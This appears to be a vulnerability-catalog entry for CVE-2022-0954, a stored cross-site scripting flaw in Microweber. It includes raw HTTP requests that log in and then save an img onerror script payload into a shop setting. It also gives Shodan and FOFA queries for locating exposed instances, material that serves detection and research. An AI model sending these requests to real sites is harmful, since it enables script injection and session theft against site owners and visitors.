---
layout: "post"
cve_id: "CVE-2022-0954"
title: "Microweber <1.2.11 - Stored Cross-Site Scripting"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-0954.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-0954.yaml"
author: "amit-jd"
severity: "medium"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute malicious scripts in the context of the victim's browser, leading to potential data theft, session hijacking, or defacement of the affected website.
"
remediation: "Upgrade Microweber to version 1.2.11 or later to mitigate this vulnerability.
"
reference:
  - "https://github.com/advisories/GHSA-8c76-mxv5-w4g8"
  - "https://huntr.dev/bounties/b99517c0-37fc-4efa-ab1a-3591da7f4d26/"
  - "https://github.com/microweber/microweber/commit/955471c27e671c49e4b012e3b120b004082ac3f7"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-0954"
  - "https://github.com/ARPSyndicate/kenzer-templates"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N', 'cvss-score': 5.4, 'cve-id': 'CVE-2022-0954', 'cwe-id': 'CWE-79', 'epss-score': 0.05808, 'epss-percentile': 0.90227, 'cpe': 'cpe:2.3:a:microweber:microweber:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 3, 'vendor': 'microweber', 'product': 'microweber', 'shodan-query': ['http.favicon.hash:780351152', 'http.html:"microweber"'], 'fofa-query': ['body="microweber"', 'icon_hash=780351152']}"
tags:
  - "cve2022"
  - "cve"
  - "xss"
  - "microweber"
  - "huntr"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
Microweber before 1.2.1 contains multiple stored cross-site scripting vulnerabilities in Shop's Other Settings, Autorespond E-mail Settings, and Payment Methods.


## ðŸŒ HTTP Request
```nohighlight
POST /api/user_login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Connection: close
Content-Length: 31
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=H2jpUw&password=KxR7LT
```

```nohighlight
POST /api/save_option HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Connection: close
Content-Length: 166
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://www.victim.com/admin/view:shop/action:options
Accept-Encoding: gzip

option_key=checkout_url&option_group=shop&option_value=%22%3E%3CiMg+SrC%3D%22x%22+oNeRRor%3D%22alert(document.domain)%3B%22%3E&module=shop%2Forders%2Fsettings%2Fother
```

```nohighlight
POST /module/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.14
Connection: close
Content-Length: 198
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://www.victim.com/admin/view:shop/action:options
Accept-Encoding: gzip

module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-settings-admin&class=card-body+pt-3&option_group=shop%2Forders%2Fsettings%2Fother&is_system=1&style=position%3A+relative%3B
```

